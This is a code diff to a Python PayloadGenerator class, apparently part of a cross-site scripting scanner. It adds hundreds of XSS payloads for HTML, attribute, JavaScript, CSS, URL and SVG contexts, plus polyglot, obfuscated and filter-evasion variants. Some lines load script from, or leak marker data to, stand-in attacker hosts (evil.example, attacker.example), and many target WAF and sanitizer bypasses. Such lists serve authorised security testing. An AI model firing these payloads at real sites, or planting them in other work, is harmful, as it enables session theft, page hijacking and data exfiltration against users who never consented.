@@ -44,8 +44,11 @@ class PayloadGenerator:
     The ranking prioritizes context-specific vectors over generic ones.
     """
 
+    # ================================================================
     # Basic HTML payloads
+    # ================================================================
     HTML_PAYLOADS = [
+        # --- Original ---
         "<script>{marker}</script>",
         "<img src=x onerror={marker}>",
         "<svg/onload={marker}>",
@@ -63,35 +66,185 @@ class PayloadGenerator:
         "<video><track default oncuechange={marker}>",
         "<form><button formaction=javascript:{marker}>",
         "<svg><animate onbegin={marker}>",
+
+        # --- Modern event-handler variants ---
+        "<dialog open onclose={marker}>",
+        "<dialog open ontoggle={marker}>",
+        "<details ontoggle={marker}>",
+        "<marquee onfinish={marker}>",
+        "<marquee onbounce={marker}>",
+        "<video src=x onerror={marker}>",
+        "<video poster=x onerror={marker}>",
+        "<video><source src=x onerror={marker}>",
+        "<audio><source src=x onerror={marker}>",
+        "<img src=x onanimationstart={marker}>",
+        "<img src=x ontransitionend={marker}>",
+        "<img src=x onpointerover={marker}>",
+        "<img src=x onpointerenter={marker}>",
+        "<img src=x onload={marker}>",
+        "<img src=x onerror={marker} src=1>",                       # attribute-order defeat
+        "<input autofocus onfocus={marker} type=submit>",
+        "<input autofocus onfocusin={marker}>",
+        "<body onpageshow={marker}>",
+        "<body onhashchange={marker}>",
+
+        # --- Less-common tags with active content ---
+        "<object data=javascript:{marker}>",
+        "<embed src=javascript:{marker}>",
+        "<link rel=stylesheet href=\"data:text/css,{marker}\">",
+        "<meta http-equiv=refresh content=\"0;url=javascript:{marker}\">",
+        "<base href=javascript:{marker}//>",
+        "<a href=javascript:{marker}>click</a>",
+        "<a href=\"javascript:{marker}\">click</a>",
+        "<form action=javascript:{marker}><input type=submit></form>",
+        "<form><input type=submit formaction=javascript:{marker}></form>",
+        "<button formaction=javascript:{marker} form=f>click</button><form id=f></form>",
+        "<iframe src=javascript:{marker}></iframe>",
+        "<iframe src=\"data:text/html,<script>{marker}</script>\"></iframe>",
+        "<table background=javascript:{marker}>",                    # IE legacy
+        "<isindex action=javascript:{marker} type=image>",           # legacy, parsed as form
+        "<frameset onload={marker}>",
+        "<frame src=javascript:{marker}>",
+
+        # --- mXSS / mutation vectors (execute after sanitize → re-parse) ---
+        "<noscript><p title=\"</noscript><script>{marker}</script>\">",
+        "<template><script>{marker}</script></template>",
+        "<template><img src=x onerror={marker}></template>",
+        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror={marker}>",
+        "<svg><foreignObject><script>{marker}</script></foreignObject></svg>",
+
+        # --- Declarative shadow DOM (Chrome 90+) ---
+        "<div><template shadowrootmode=open><script>{marker}</script></template></div>",
+        "<div><template shadowrootmode=open><img src=x onerror={marker}></template></div>",
+
+        # --- SVG variants (cross-reference with SVG_PAYLOADS) ---
+        "<svg onload={marker}></svg>",
+        "<svg><set attributeName=onload to={marker}>",
+        "<svg><animateMotion onbegin={marker} dur=1s>",
+        "<svg><discard onbegin={marker}>",
+        "<svg><a><text x=20 y=20>{marker}</text></a></svg>",
     ]
 
-    # Attribute payloads
+    # ================================================================
+    # Attribute payloads — double-quoted context
+    # ================================================================
     ATTR_DOUBLE_PAYLOADS = [
+        # --- Original ---
         "\" onerror={marker} \"",
         "\" onmouseover={marker} \"",
         "\" autofocus onfocus={marker} \"",
         "\"><script>{marker}</script>",
         "\" x=\"y\" onerror={marker} \"",
+
+        # --- Event handler injection ---
+        "\" onload={marker} x=\"",
+        "\" onfocus={marker} autofocus x=\"",
+        "\" onanimationstart={marker} style=animation-name:x x=\"",
+        "\" ontoggle={marker} \"",
+        "\" onbeforetoggle={marker} \"",
+        "\" onpointerover={marker} \"",
+        "\" onfocusin={marker} autofocus \"",
+        "\" onmouseenter={marker} \"",
+        "\" onclick={marker} \"",
+        "\" onauxclick={marker} \"",
+        "\" onwheel={marker} \"",
+
+        # --- Attribute chaining / breaking out ---
+        "\" style=\"x\" onerror={marker} \"",
+        "\" src=x onerror={marker} \"",
+        "\" href=javascript:{marker} \"",
+        "\" action=javascript:{marker} \"",
+        "\" formaction=javascript:{marker} \"",
+        "\" data=x onclick={marker} \"",
+
+        # --- Tag breakouts ---
+        "\"><img src=x onerror={marker}>",
+        "\"><svg onload={marker}>",
+        "\"><iframe srcdoc=\"<script>{marker}</script>\">",
+        "\"><details open ontoggle={marker}>",
+
+        # --- Encoded quote variants ---
+        "\" onerror=&#x61;lert({marker}) \"",                       # partial entity (used by WAF bypass)
+        "\" onerror=alert&#x28;1&#x29; x=\"{marker}\"",             # marker in inert position
     ]
 
+    # ================================================================
+    # Attribute payloads — single-quoted context
+    # ================================================================
     ATTR_SINGLE_PAYLOADS = [
+        # --- Original ---
         "' onerror={marker} '",
         "' onmouseover={marker} '",
         "' autofocus onfocus={marker} '",
         "'><script>{marker}</script>",
         "' x='y' onerror={marker} '",
+
+        # --- Event handler injection ---
+        "' onload={marker} x='",
+        "' onfocus={marker} autofocus x='",
+        "' ontoggle={marker} '",
+        "' onbeforetoggle={marker} '",
+        "' onpointerover={marker} '",
+        "' onfocusin={marker} autofocus '",
+        "' onmouseenter={marker} '",
+        "' onclick={marker} '",
+        "' onauxclick={marker} '",
+
+        # --- Attribute chaining ---
+        "' style='x' onerror={marker} '",
+        "' src=x onerror={marker} '",
+        "' href=javascript:{marker} '",
+        "' action=javascript:{marker} '",
+        "' formaction=javascript:{marker} '",
+
+        # --- Tag breakouts ---
+        "'><img src=x onerror={marker}>",
+        "'><svg onload={marker}>",
+        "'><iframe srcdoc='<script>{marker}</script>'>",
+        "'><details open ontoggle={marker}>",
     ]
 
+    # ================================================================
+    # Attribute payloads — unquoted context
+    # ================================================================
     ATTR_UNQUOTED_PAYLOADS = [
+        # --- Original ---
         " onerror={marker} ",
         " onmouseover={marker} ",
         " autofocus onfocus={marker} ",
         "><script>{marker}</script>",
         " x=y onerror={marker} ",
+
+        # --- Event handler injection (space-delimited, unquoted attributes
+        #     terminate at whitespace or `>`) ---
+        " onfocus={marker} autofocus ",
+        " ontoggle={marker} ",
+        " onbeforetoggle={marker} ",
+        " onpointerover={marker} ",
+        " onfocusin={marker} autofocus ",
+        " onmouseenter={marker} ",
+        " onclick={marker} ",
+        " onauxclick={marker} ",
+        " onanimationstart={marker} ",
+
+        # --- Attribute chaining ---
+        " src=x onerror={marker} ",
+        " href=javascript:{marker} ",
+        " action=javascript:{marker} ",
+        " formaction=javascript:{marker} ",
+
+        # --- Tag breakouts ---
+        "><img src=x onerror={marker}>",
+        "><svg onload={marker}>",
+        "><details open ontoggle={marker}>",
+        "><iframe srcdoc=\"<script>{marker}</script>\">",
     ]
 
+    # ================================================================
     # JavaScript payloads
+    # ================================================================
     JS_PAYLOADS = [
+        # --- Original ---
         ";{marker}//",
         ");{marker}//",
         "}};{marker}//",
@@ -105,49 +258,253 @@ class PayloadGenerator:
         ";{marker}`1`//",
         ";location='javascript:'+{marker}//",
         ";throw onerror={marker},1//",
+
+        # --- String-context breakouts ---
+        "\\';{marker}//",                                          # escaped single quote
+        "\\\";{marker}//",                                         # escaped double quote
+        "*/{marker}/*",                                            # block-comment breakout
+        "`;{marker}//",                                            # backtick (template literal)
+
+        # --- Template literal injection ---
+        "${ {marker} }",
+        "`+{marker}+`",
+        "`${`${`${ {marker} }`}`}`",
+
+        # --- Indirect call / constructor reach ---
+        "constructor.constructor('{marker}')()",
+        "({}).constructor.constructor('{marker}')()",
+        "this.constructor.constructor('{marker}')()",
+        "[].filter.constructor('{marker}')()",
+
+        # --- Dynamic import / module loading ---
+        "import('{marker}')",
+        "importScripts('{marker}')",
+
+        # --- Backtick-only execution (no parentheses) ---
+        "{marker}`1`",
+
+        # --- Call with harmless expression (fires when parsed) ---
+        "void {marker}",
+        "typeof {marker}",
+        "!{marker}",
+
+        # --- Async/await contexts ---
+        "await {marker}",
+        ";(async()=>{marker})()",
+
+        # --- Wrapped in try/catch (survives surrounding scope) ---
+        ";try{{marker}}catch(e){}//",
     ]
 
+    # ================================================================
     # CSS payloads
+    # ================================================================
     CSS_PAYLOADS = [
+        # --- Original ---
         ";expression({marker})",
         "};{marker};{",
         "x:expression({marker})",
         "background:url('javascript:{marker}')",
+
+        # --- Modern @import ---
+        "@import 'javascript:{marker}';",
+        "@import url('javascript:{marker}');",
+        "@import url(\"data:text/css,{marker}\");",
+        "@import 'data:text/css;base64,{marker}';",
+
+        # --- url() sinks ---
+        "background:url(javascript:{marker})",                     # unquoted
+        "background:url(\"javascript:{marker}\")",
+        "background-image:url('data:text/css,{marker}')",
+        "list-style-image:url('javascript:{marker}')",
+        "cursor:url('javascript:{marker}')",
+        "content:url('data:text/html,{marker}')",
+
+        # --- Legacy IE / behaviour sinks ---
+        "behavior:url({marker}.htc)",
+        "-ms-behavior:url({marker}.htc)",
+        "-moz-binding:url('data:text/xml,{marker}')",
+        "filter:progid:DXImageTransform.Microsoft.{marker}",
+
+        # --- CSS exfiltration (marker leaks via font/URL) ---
+        "@font-face{font-family:x;src:url('https://evil.example/?c={marker}')}",
+        "body{background:url('https://evil.example/?c={marker}')}",
+        "x{font-family:'{marker}'}",
+
+        # --- CSS escapes (break out of keyword filters) ---
+        "\\65 xpression({marker})",                                # \65 = 'e'
+        "\\000065 xpression({marker})",
+        "e\\78pression({marker})",                                 # \78 = 'x'
+
+        # --- Tag-breakout (ends `<style>` block) ---
+        "</style><script>{marker}</script>",
+        "</style><img src=x onerror={marker}>",
     ]
 
+    # ================================================================
     # URL payloads
+    # ================================================================
     URL_PAYLOADS = [
+        # --- Original ---
         "javascript:{marker}",
         "data:text/html,<script>{marker}</script>",
+
+        # --- javascript: whitespace / control-character bypasses ---
+        "java\tscript:{marker}",                                   # tab
+        "java\nscript:{marker}",                                   # newline
+        "java\rscript:{marker}",                                   # carriage return
+        "\u000Bjavascript:{marker}",                               # vertical tab (CVE-2020-…)
+        "\u000Cjavascript:{marker}",                               # form feed
+        "\u0000javascript:{marker}",                               # null byte
+        " javascript:{marker}",                                    # leading space
+        "javascript\u0001:{marker}",                               # control char
+
+        # --- HTML-entity obfuscation ---
+        "&#x6A;avascript:{marker}",
+        "javascript&colon;{marker}",
+        "&#106;avascript&#58;{marker}",
+
+        # --- Comment / protocol tricks ---
+        "javascript:/*{marker}*/",
+        "javascript://%0A{marker}",
+        "javascript://attacker.example/%0A{marker}",
+
+        # --- data: URI variants ---
+        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",     # base64 of <script>alert(1)</script>
+        "data:text/javascript,{marker}",
+        "data:application/javascript,{marker}",
+        "data:application/x-javascript,{marker}",
+        "data:text/html,<script>{marker}</script>",
+        "data:text/html;charset=utf-8,<script>{marker}</script>",
+
+        # --- Blob / filesystem URLs (must be constructed at runtime) ---
+        "blob:https://attacker.example/{marker}",
+        "filesystem:https://attacker.example/temporary/{marker}.js",
+
+        # --- Legacy / browser-specific ---
+        "vbscript:msgbox({marker})",
+        "livescript:{marker}",
+        "mocha:{marker}",
     ]
 
+    # ================================================================
     # SVG payloads
+    # ================================================================
     SVG_PAYLOADS = [
+        # --- Original ---
         "<svg onload={marker}>",
         "<svg><script>{marker}</script></svg>",
         "<svg><animate attributeName=href values=javascript:{marker}>",
+
+        # --- Script loading ---
+        "<svg><script href=\"data:text/javascript,{marker}\"/></svg>",
+        "<svg><script xlink:href=\"javascript:{marker}\"/></svg>",
+        "<svg><script xlink:href=\"data:text/javascript,{marker}\"/></svg>",
+
+        # --- Event-driven ---
+        "<svg><animate onbegin={marker}>",
+        "<svg><set attributeName=onload to={marker}>",
+        "<svg><animateMotion onbegin={marker} dur=1s>",
+        "<svg><animateTransform onbegin={marker}>",
+        "<svg><handler onbegin={marker}>",                         # rare but supported
+        "<svg><discard onbegin={marker}>",
+        "<svg><use href=\"data:image/svg+xml,<svg onload={marker}>\">",
+        "<svg><image href=\"javascript:{marker}\">",
+        "<svg><a xlink:href=\"javascript:{marker}\"><text>click</text></a></svg>",
+
+        # --- Namespace breakout / mXSS ---
+        "<svg><foreignObject><script>{marker}</script></foreignObject></svg>",
+        "<svg><foreignObject><img src=x onerror={marker}></foreignObject></svg>",
+        "<svg><title><style><img src=x onerror={marker}></style></title></svg>",
+        "<svg><desc><style><img src=x onerror={marker}></style></desc></svg>",
+
+        # --- CDATA breakout ---
+        "<svg><![CDATA[><img src=x onerror={marker}>]]></svg>",
     ]
 
+    # ================================================================
     # Polyglot payloads (work in multiple contexts)
+    # ================================================================
     POLYGLOT_PAYLOADS = [
+        # --- Original ---
         "<script>/*<sCRIPT%20src=x%20onerror={marker}>*/</script>",
         "<script>/*<script>{marker}</script>*/</script>",
         "\"'><script>{marker}</script>",
         "<img src=x onerror={marker}>\"'><script>{marker}</script>",
         "javascript:/*'<script>{marker}</script>*/",
+
+        # --- Jackmasa-style (HTML + attribute + JS) ---
+        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk={marker} )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd={marker}//>\\x3e",
+
+        # --- HTML + attribute polyglot ---
+        "\"><img src=x onerror={marker}>\".<script>{marker}</script>",
+        "'><img src=x onerror={marker}>'.<script>{marker}</script>",
+        "\"><svg/onload={marker}>\"'><script>{marker}</script>",
+
+        # --- JS string + comment polyglot ---
+        "';{marker}//",
+        "\\';{marker}//",
+        "`;{marker}//",
+
+        # --- URL + HTML polyglot ---
+        "javascript:{marker}<!--",
+        "javascript://%0A{marker}-->",
+
+        # --- Multi-breakout (quotes + angle brackets) ---
+        "\"'><svg/onload={marker}>\",'",
+        "';alert({marker})//';alert({marker})//",
     ]
 
+    # ================================================================
     # Obfuscated payloads
+    # ================================================================
     OBFUSCATED_PAYLOADS = [
+        # --- Original ---
         "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
         "<script>alert&#40;1&#41;</script>",
         "<script>alert(String.fromCharCode(49))</script>",
         "<script>\u0061\u006c\u0065\u0072\u0074(1)</script>",
         "<script>alert(1)//\n</script>",
+
+        # --- JavaScript char/unicode escapes ---
+        "<script>\\u0061lert({marker})</script>",
+        "<script>\\x61lert({marker})</script>",
+        "<script>[].filter.constructor('{marker}')()</script>",
+        "<script>top['al'+'ert']({marker})</script>",
+        "<script>window['al'+'ert']({marker})</script>",
+
+        # --- String.fromCharCode / atob / Base64 ---
+        "<script>eval(atob('YWxlcnQoMSk='))</script>",             # atob('alert(1)')
+        "<script>[].constructor.constructor('{marker}')()</script>",
+        "<img src=x onerror=eval(atob('{marker}'))>",
+
+        # --- Template literal / backtick variants ---
+        "<script>alert`{marker}`</script>",
+        "<script>eval`\\u0061lert({marker})`</script>",
+
+        # --- HTML entity / numeric reference ---
+        "&#x3C;script&#x3E;{marker}&#x3C;/script&#x3E;",
+        "&lt;script&gt;{marker}&lt;/script&gt;",                   # reflection-only, useful for context check
+
+        # --- Comment injection (break keyword signatures) ---
+        "<script>e/**/v/**/a/**/l({marker})</script>",
+        "<script>eval/**/(/**/atob('{marker}')/**/)</script>",
+        "<scri/**/pt>{marker}</scri/**/pt>",
+
+        # --- JSFuck-lite (bracket/constructor chain) ---
+        "<script>[][(![]+[])[+[]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([]+{})[+!+[]]+(!![]+[])[+[]]]+[])[+[]]+([]+{})[+!+[]]</script>",
+
+        # --- Whitespace-obfuscated tag names ---
+        "<\tscript\t>{marker}</\tscript\t>",
+        "<\nscript\n>{marker}</\nscript\n>",
+        "<script\x0B>{marker}</script>",                           # vertical tab inside tag
     ]
 
+    # ================================================================
     # Filter evasion payloads
+    # ================================================================
     EVASION_PAYLOADS = [
+        # --- Original ---
         "<script>{marker}</script>",
         "<script >{marker}</script>",
         "<script\n>{marker}</script>",
@@ -155,6 +512,58 @@ class PayloadGenerator:
         "<script/* */{marker}</script>",
         "<sCrIpT>{marker}</sCrIpT>",
         "<script%20{marker}</script>",
+
+        # --- Case / mixed-case variants ---
+        "<ScRiPt>{marker}</sCrIpT>",
+        "<SCRIPT>{marker}</SCRIPT>",
+        "<sCrIpT>{marker}</script>",
+
+        # --- Whitespace / control-char injection inside tag ---
+        "<script\t>{marker}</script>",
+        "<script\r>{marker}</script>",
+        "<script\f>{marker}</script>",                             # form feed
+        "<script\x00>{marker}</script>",                           # null byte
+        "<script\x0B>{marker}</script>",                           # vertical tab
+        "<script\v>{marker}</script>",
+        "<script\x20\x20>{marker}</script>",
+
+        # --- Comment injection inside tag (breaks `<script>` signature) ---
+        "<scr<!-- -->ipt>{marker}</scr<!-- -->ipt>",
+        "<scr<script>ipt>{marker}</scr</script>ipt>",              # nested script tag split
+        "<script /**/>{marker}</script>",
+        "<script/**/type/**/=/**/text/javascript>{marker}</script>",
+
+        # --- Attribute injection inside the script tag itself ---
+        "<script src=//attacker.example/x.js>{marker}</script>",
+        "<script src=//attacker.example/x.js defer>{marker}</script>",
+        "<script for=document event=onclick>{marker}</script>",     # legacy IE
+        "<script language=vbscript>{marker}</script>",              # legacy IE
+
+        # --- Tag-splitting / URL-encoded variants ---
+        "%3Cscript%3E{marker}%3C/script%3E",
+        "%3Cscript%3E{marker}%3C%2Fscript%3E",
+        "%253Cscript%253E{marker}%253C/script%253E",                # double-encoded
+
+        # --- Alternative tag names (case-varied / trailing space) ---
+        "<SCRIPT SRC=//attacker.example/x.js>",
+        "<img/src=x/onerror={marker}>",
+        "<img src=x/onerror={marker}>",
+        "<img src=\"x\" onerror={marker}>",
+        "<svg/onload={marker}/>",
+        "<svg/onload={marker}//>",
+
+        # --- Attribute-name-less / value confusion ---
+        "<img src=x onerror={marker} onerror=1>",                  # duplicate attribute (last wins)
+        "<img src=x onerror onerror={marker}>",
+        "<img src=x onerror=\"x\" onerror={marker}>",
+
+        # --- Tag-name obfuscation with tab inside the name ---
+        "<img\tsrc\t=\tx\tonerror\t=\t{marker}>",
+        "<img\nsrc\n=\nx\nonerror\n=\n{marker}>",
+
+        # --- Bare URL-encoded quotes for context breaking ---
+        "%22%3E%3Cscript%3E{marker}%3C/script%3E",
+        "%27%3E%3Cscript%3E{marker}%3C/script%3E",
     ]
 
     def __init__(self):
